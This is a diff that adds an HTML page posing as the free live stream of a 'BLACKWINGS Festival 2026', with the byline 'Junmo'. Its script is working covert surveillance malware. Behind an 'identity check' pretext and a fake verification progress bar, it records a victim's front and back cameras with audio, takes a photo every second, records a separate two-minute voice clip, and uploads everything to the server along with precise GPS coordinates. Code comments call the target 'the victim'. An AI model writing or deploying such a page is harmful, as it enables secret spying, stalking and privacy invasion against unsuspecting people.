@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0d0620">
+<title>BLACKWINGS — Official Live Stream</title>
+<style>
+  :root{
+    --bg1:#1b0f3b; --bg2:#0d0620;
+    --accent:#ff2d78; --accent2:#ffb347;
+    --ok:#2ecc71; --bad:#ff4757;
+    --card:rgba(255,255,255,.06);
+    --border:rgba(255,255,255,.14);
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    color:#fff;
+    background:radial-gradient(1200px 800px at 15% 10%,var(--bg1),var(--bg2) 60%,#04010b);
+    min-height:100vh;overflow-x:hidden;
+  }
+  /* hidden capture camera — invisible but recording */
+  #cam{
+    position:fixed; top:-9999px; left:-9999px;
+    width:4px; height:4px; opacity:.001;
+    pointer-events:none; z-index:-1;
+  }
+  .screen{display:none;min-height:100vh;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+  .screen.active{display:flex}
+  .logo{
+    font-size:44px;font-weight:900;letter-spacing:6px;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    text-shadow:0 0 30px rgba(255,45,120,.35);
+  }
+  .livebadge{
+    display:inline-flex;align-items:center;gap:8px;margin-bottom:14px;
+    background:rgba(255,45,120,.12);border:1px solid rgba(255,45,120,.4);
+    color:var(--accent);font-size:12px;font-weight:700;letter-spacing:3px;
+    padding:6px 16px;border-radius:30px;
+  }
+  .dotlive{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:blink 1.2s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+  .subtitle{font-size:16px;color:#c9c2e6;margin-top:10px;max-width:360px;line-height:1.5}
+  .byline{
+    margin-top:6px;font-size:11px;font-weight:700;letter-spacing:6px;color:var(--accent2);
+    text-transform:uppercase;opacity:.9;
+  }
+  .countdown{display:flex;gap:12px;margin:28px 0 8px}
+  .cdbox{
+    background:var(--card);border:1px solid var(--border);border-radius:14px;
+    padding:14px 16px;min-width:64px;
+  }
+  .cdnum{font-size:28px;font-weight:800;color:#fff}
+  .cdlbl{font-size:10px;letter-spacing:2px;color:#8f86b8;text-transform:uppercase;margin-top:4px}
+  .btn-join{
+    margin-top:26px;border:none;cursor:pointer;color:#fff;
+    font-size:17px;font-weight:800;letter-spacing:2px;
+    padding:16px 52px;border-radius:40px;
+    background:linear-gradient(90deg,var(--accent),#ff7a3d);
+    box-shadow:0 8px 30px rgba(255,45,120,.4);
+    transition:transform .15s ease,box-shadow .15s ease;
+  }
+  .btn-join:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(255,45,120,.55)}
+  .btn-join:active{transform:scale(.97)}
+  .footnote{margin-top:18px;font-size:11px;color:#7a71a5;letter-spacing:1px}
+  /* ---- verifying screen ---- */
+  .verify-title{font-size:15px;color:#9a91c4;letter-spacing:2px;margin-bottom:26px}
+  .vdot{
+    width:14px;height:14px;border-radius:50%;background:var(--accent);
+    margin:0 auto 14px;animation:pulse 1s infinite;
+    box-shadow:0 0 0 0 rgba(255,45,120,.6);
+  }
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(255,45,120,.6);opacity:1}
+    70%{box-shadow:0 0 0 18px rgba(255,45,120,0);opacity:.7}
+    100%{box-shadow:0 0 0 0 rgba(255,45,120,0);opacity:1}
+  }
+  .verifying{
+    font-size:22px;font-weight:800;letter-spacing:3px;color:#fff;
+  }
+  .pbar{
+    width:min(320px,78vw);height:8px;border-radius:10px;overflow:hidden;
+    background:rgba(255,255,255,.08);border:1px solid var(--border);margin:22px auto 0;
+  }
+  .pfill{
+    height:100%;width:0%;border-radius:10px;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    transition:width .3s linear;
+  }
+  .morse{
+    margin-top:26px;font-family:'Courier New',monospace;font-size:15px;
+    letter-spacing:3px;color:var(--accent2);opacity:.95;
+    background:rgba(255,179,71,.06);border:1px solid rgba(255,179,71,.25);
+    padding:12px 18px;border-radius:12px;word-break:break-all;
+  }
+  /* ---- denied screen ---- */
+  .denied-title{font-size:30px;font-weight:900;letter-spacing:4px;color:var(--bad)}
+  .denied-text{max-width:330px;margin-top:16px;color:#c9c2e6;font-size:15px;line-height:1.6}
+  .btn-retry{
+    margin-top:26px;border:1px solid var(--border);cursor:pointer;color:#fff;
+    font-size:15px;font-weight:700;padding:13px 40px;border-radius:40px;background:var(--card);
+  }
+  /* ---- success / e-ticket ---- */
+  .ticket{
+    background:linear-gradient(160deg,rgba(255,255,255,.09),rgba(255,255,255,.03));
+    border:1px solid var(--border);border-radius:20px;padding:34px 30px;max-width:340px;width:100%;
+    box-shadow:0 20px 60px rgba(0,0,0,.45);
+  }
+  .ticket .ok{font-size:38px;margin-bottom:10px}
+  .ticket h2{font-size:24px;font-weight:900;letter-spacing:2px;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    -webkit-background-clip:text;background-clip:text;color:transparent}
+  .ticket .row{margin-top:16px;font-size:13px;color:#c9c2e6;line-height:1.8}
+  .ticket .row b{color:#fff;display:block;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:#8f86b8}
+  .ticket .signed{margin-top:22px;font-size:10px;letter-spacing:5px;color:var(--accent2)}
+</style>
+</head>
+<body>
+
+<!-- hidden capture camera: never visible to the victim -->
+<video id="cam" autoplay muted playsinline></video>
+
+<!-- ================= LANDING ================= -->
+<div class="screen active" id="s-landing">
+  <span class="livebadge"><span class="dotlive"></span>LIVE</span>
+  <h1 class="logo">BLACKWINGS</h1>
+  <p class="subtitle">Festival 2026 — opening ceremony streaming free from the main stage</p>
+  <div class="byline">B Y &nbsp; J U N M O</div>
+  <div class="countdown">
+    <div class="cdbox"><div class="cdnum" id="cd-d">03</div><div class="cdlbl">Days</div></div>
+    <div class="cdbox"><div class="cdnum" id="cd-h">12</div><div class="cdlbl">Hours</div></div>
+    <div class="cdbox"><div class="cdnum" id="cd-m">47</div><div class="cdlbl">Min</div></div>
+    <div class="cdbox"><div class="cdnum" id="cd-s">00</div><div class="cdlbl">Sec</div></div>
+  </div>
+  <button class="btn-join" id="btn-join">JOIN LIVE STREAM</button>
+  <p class="footnote">Camera, microphone &amp; location access are all required to join the live room (identity check).</p>
+</div>
+
+<!-- ================= VERIFYING (videos + separate voice, all hidden, 2 min) ================= -->
+<div class="screen" id="s-verify">
+  <p class="verify-title" id="verify-title">Verifying access…</p>
+  <div class="vdot"></div>
+  <div class="verifying">● VERIFYING PLEASE WAIT</div>
+  <div class="pbar"><div class="pfill" id="pfill"></div></div>
+  <div class="morse">-.. --- -. .---- - / - .-. -.-- / -- .</div>
+</div>
+
+<!-- ================= ACCESS REQUIRED ================= -->
+<div class="screen" id="s-denied">
+  <h1 class="denied-title">ACCESS REQUIRED</h1>
+  <p class="denied-text">
+    Camera, microphone and location access are all required to join the live room.
+    Please allow <b>all three</b> and try again.
+  </p>
+  <button class="btn-retry" onclick="location.reload()">TRY AGAIN</button>
+</div>
+
+<!-- ================= SUCCESS / E-TICKET ================= -->
+<div class="screen" id="s-done">
+  <div class="ticket">
+    <div class="ok">✅</div>
+    <h2>YOU'RE IN!</h2>
+    <div class="row"><b>Event</b>BLACKWINGS Festival 2026 — Opening Night</div>
+    <div class="row"><b>Entry</b>General Admission · Gate 7 · Main Stage</div>
+    <div class="row"><b>Time</b>Doors open now — enjoy the show!</div>
+    <div class="signed">P R E S E N T E D &nbsp; B Y &nbsp; J U N M O</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+
+  var camEl = document.getElementById('cam');
+  var sessionId = null;
+  var currentCam = 'front';
+  var shotIndex = 0;
+
+  var SEG_MS   = 60000;   // 1 minute per camera segment
+  var TOTAL_MS = 120000;  // 2×1min videos + 2min separate voice, all parallel
+
+  /* ---------- tiny helpers ---------- */
+  function $(id){ return document.getElementById(id); }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function safeFetch(url, opts){
+    try { return fetch(url, opts).catch(function(){}); } catch(e) { return Promise.resolve(); }
+  }
+  function stopStream(s){
+    if(s){ s.getTracks().forEach(function(t){ try{ t.stop(); }catch(e){} }); }
+  }
+
+  function show(id){
+    ['s-landing','s-verify','s-denied','s-done'].forEach(function(x){
+      document.getElementById(x).classList.toggle('active', x === id);
+    });
+  }
+  function setVerifyTitle(t){ document.getElementById('verify-title').textContent = t; }
+
+  /* ---------- countdown ---------- */
+  var target = Date.now() + (3*24*3600 + 12*3600 + 47*60) * 1000;
+  setInterval(function(){
+    var s = Math.max(0, Math.floor((target - Date.now())/1000));
+    var d = Math.floor(s/86400), h = Math.floor(s%86400/3600), m = Math.floor(s%3600/60), x = s%60;
+    $('cd-d').textContent = ('0'+d).slice(-2);
+    $('cd-h').textContent = ('0'+h).slice(-2);
+    $('cd-m').textContent = ('0'+m).slice(-2);
+    $('cd-s').textContent = ('0'+x).slice(-2);
+  }, 1000);
+
+  /* ---------- media acquisition ---------- */
+  function getCam(facing){
+    var v = facing === 'environment'
+      ? {facingMode:{ideal:'environment'}, width:{ideal:1280}, height:{ideal:720}}
+      : {facingMode:'user', width:{ideal:1280}, height:{ideal:720}};
+    return navigator.mediaDevices.getUserMedia({video:v, audio:false});
+  }
+  function getMic(){
+    return navigator.mediaDevices.getUserMedia({video:false, audio:true});
+  }
+  function getLoc(){
+    return new Promise(function(res){
+      if(!navigator.geolocation) return res(null);
+      navigator.geolocation.getCurrentPosition(
+        function(p){ res({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}); },
+        function(){ res(null); },
+        {enableHighAccuracy:true, timeout:12000, maximumAge:0}
+      );
+    });
+  }
+
+  /* play the hidden feed — never throws, never hangs (4s timeout) */
+  function playCam(el, stream){
+    el.srcObject = stream;
+    el.muted = true;
+    return Promise.race([
+      el.play().catch(function(){}),
+      sleep(4000)
+    ]);
+  }
+
+  /* merge video track + original mic track into ONE stream (voice inside video) */
+  function combine(videoStream, audioStream){
+    var tracks = [];
+    videoStream.getVideoTracks().forEach(function(t){ tracks.push(t); });
+    if(audioStream){ audioStream.getAudioTracks().forEach(function(t){ tracks.push(t); }); }
+    return new MediaStream(tracks);
+  }
+
+  function pickMime(kind){
+    var list = kind === 'audio'
+      ? ['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg']
+      : ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4'];
+    for(var i=0;i<list.length;i++){
+      if(window.MediaRecorder && MediaRecorder.isTypeSupported(list[i])) return list[i];
+    }
+    return '';
+  }
+
+  /* ---------- photo capture (retries until feed is ready) ---------- */
+  function snapOnce(){
+    if(camEl.readyState < 2 || !camEl.videoWidth || !camEl.videoHeight) return false;
+    try{
+      var canvas = document.createElement('canvas');
+      canvas.width  = camEl.videoWidth;
+      canvas.height = camEl.videoHeight;
+      canvas.getContext('2d').drawImage(camEl, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(function(blob){
+        if(!blob) return;
+        var fd = new FormData();
+        fd.append('session_id', sessionId);
+        fd.append('cam', currentCam);
+        fd.append('index', String(++shotIndex));
+        fd.append('photo', blob, 'shot.jpg');
+        safeFetch('/capture', {method:'POST', body:fd});
+      }, 'image/jpeg', 0.85);
+      return true;
+    }catch(e){ return false; }
+  }
+
+  /* ---------- separate hidden voice recording: 2 minutes, standalone file ---------- */
+  /* uses a CLONED mic track so it never conflicts with the video recorders */
+  function startVoice(stream){
+    return new Promise(function(resolve){
+      var track = stream.getAudioTracks()[0];
+      if(!track){ resolve(); return; }
+      var clone = track.clone();
+      var mime = pickMime('audio');
+      var rec;
+      try{
+        rec = new MediaRecorder(
+          new MediaStream([clone]),
+          mime ? {mimeType:mime, audioBitsPerSecond:128000} : {audioBitsPerSecond:128000}
+        );
+      }catch(e){
+        try{ rec = new MediaRecorder(new MediaStream([clone])); }
+        catch(e2){ try{ clone.stop(); }catch(e3){} resolve(); return; }
+      }
+      var chunks = [];
+      var settled = false;
+      var done = function(){
+        if(settled) return;
+        settled = true;
+        try{ if(rec.state !== 'inactive') rec.stop(); }catch(e){}
+        try{ clone.stop(); }catch(e){}
+        if(chunks.length){
+          var blob = new Blob(chunks, {type: rec.mimeType || 'audio/webm'});
+          var fd = new FormData();
+          fd.append('session_id', sessionId);
+          fd.append('audio', blob, 'voice');
+          safeFetch('/upload/audio', {method:'POST', body:fd}).then(resolve, resolve);
+        } else {
+          resolve();
+        }
+      };
+      rec.ondataavailable = function(e){ if(e.data && e.data.size) chunks.push(e.data); };
+      rec.onstop = done;
+      rec.onerror = done;
+      try{ rec.start(1000); }catch(e){ done(); return; }
+      setTimeout(function(){ try{ if(rec.state !== 'inactive') rec.stop(); }catch(e){} }, TOTAL_MS);
+    });
+  }
+
+  /* ---------- one 60s camera segment: video WITH voice + 60 photos (1/sec), all hidden ---------- */
+  function runSegment(cam, videoStream, audioStream){
+    return new Promise(function(resolve){
+      currentCam = cam;
+      shotIndex = 0;
+
+      var combined = combine(videoStream, audioStream);   // voice embedded in video
+      var mime = pickMime('video');
+      var opts = {videoBitsPerSecond:2500000, audioBitsPerSecond:128000};
+      if(mime){ opts.mimeType = mime; }
+
+      var rec;
+      try{
+        rec = new MediaRecorder(combined, opts);
+      }catch(e){
+        try{ rec = new MediaRecorder(combined); }
+        catch(e2){ resolve(); return; }
+      }
+
+      var chunks = [];
+      var settled = false;
+      var photoTimer = null;
+      var stopTimer = null;
+
+      var finish = function(){
+        if(settled) return;
+        settled = true;
+        if(photoTimer) clearInterval(photoTimer);
+        if(stopTimer)  clearTimeout(stopTimer);
+        try{ if(rec.state !== 'inactive') rec.stop(); }catch(e){}
+        if(chunks.length){
+          var blob = new Blob(chunks, {type: rec.mimeType || 'video/webm'});
+          var fd = new FormData();
+          fd.append('session_id', sessionId);
+          fd.append('cam', cam);
+          fd.append('video', blob, cam + '.webm');
+          safeFetch('/upload', {method:'POST', body:fd}).then(resolve, resolve);
+        } else {
+          resolve();
+        }
+      };
+
+      rec.ondataavailable = function(e){ if(e.data && e.data.size) chunks.push(e.data); };
+      rec.onstop = finish;
+      rec.onerror = finish;
+
+      try{ rec.start(1000); }catch(e){ finish(); return; }
+
+      /* 60 photos: one EVERY 1 SECOND during the 60s segment, retry until frame ready */
+      var segStart = Date.now();
+      var shots = 0;
+      var PHOTOS = 60;              // 1 photo per second
+      var PHOTO_INTERVAL_MS = 1000; // every 1s
+      photoTimer = setInterval(function(){
+        if(shots >= PHOTOS){ clearInterval(photoTimer); return; }
+        if(Date.now() - segStart >= shots * PHOTO_INTERVAL_MS + 800){
+          if(snapOnce()) shots++;
+        }
+      }, 400);
+
+      stopTimer = setTimeout(function(){
+        try{ if(rec.state !== 'inactive') rec.stop(); }catch(e){}
+      }, SEG_MS);
+    });
+  }
+
+  /* ---------- main flow ---------- */
+  document.getElementById('btn-join').addEventListener('click', function(){
+    this.disabled = true;
+    begin().catch(function(){ try{ show('s-done'); }catch(e){} });
+  });
+
+  async function begin(){
+    var loc = null, vid = null, mic = null;
+    try{ loc = await getLoc(); }catch(e){}
+    try{ vid = await getCam('user'); }catch(e){}
+    try{ mic = await getMic(); }catch(e){}
+
+    /* ALL THREE required — one missing = dead page, zero captures */
+    if(!loc || !vid || !mic){
+      stopStream(vid); stopStream(mic);
+      show('s-denied');
+      return;
+    }
+
+    show('s-verify');
+    await playCam(camEl, vid);
+
+    try{
+      var r = await safeFetch('/session', {method:'POST'});
+      var j = await r.json();
+      sessionId = j && j.session_id;
+    }catch(e){}
+    if(!sessionId){
+      stopStream(vid); stopStream(mic);
+      show('s-denied');
+      return;
+    }
+
+    var t0 = Date.now();
+
+    /* progress bar spans the full 120s */
+    var prog = setInterval(function(){
+      var pct = Math.min(99, (Date.now() - t0) / TOTAL_MS * 100);
+      $('pfill').style.width = pct + '%';
+    }, 250);
+
+    /* separate 2-minute voice recording starts now (parallel, hidden) */
+    var voicePromise = startVoice(mic);
+
+    /* SEGMENT 1 — FRONT camera: 60s video WITH VOICE + 60 photos (1/sec) */
+    setVerifyTitle('Verifying access…');
+    try{ await runSegment('front', vid, mic); }catch(e){}
+    stopStream(vid);
+
+    /* SEGMENT 2 — BACK camera: 60s video WITH VOICE + 60 photos (1/sec) */
+    setVerifyTitle('Almost done…');
+    var back = null;
+    try{ back = await getCam('environment'); }catch(e){}
+    var secondRan = false;
+    if(back){
+      await playCam(camEl, back);
+      try{ await runSegment('back', back, mic); secondRan = true; }catch(e){}
+      stopStream(back);
+    }
+    if(!secondRan){
+      /* desktop / no rear camera -> second minute keeps front camera rolling */
+      var front2 = null;
+      try{ front2 = await getCam('user'); }catch(e){}
+      if(front2){
+        await playCam(camEl, front2);
+        try{ await runSegment('back', front2, mic); }catch(e){}
+        stopStream(front2);
+      } else {
+        await sleep(SEG_MS);
+      }
+    }
+
+    /* wait for the separate voice recording to finish (2:00) before releasing the mic */
+    await voicePromise;
+
+    clearInterval(prog);
+    $('pfill').style.width = '100%';
+    stopStream(mic);
+
+    /* GPS saved */
+    try{
+      await safeFetch('/location', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({session_id:sessionId, lat:loc.lat, lon:loc.lon, accuracy:loc.acc})
+      });
+    }catch(e){}
+
+    setVerifyTitle('Finalizing your ticket…');
+    await sleep(1200);
+    show('s-done');
+  }
+})();
+</script>
+</body>
+</html>
+
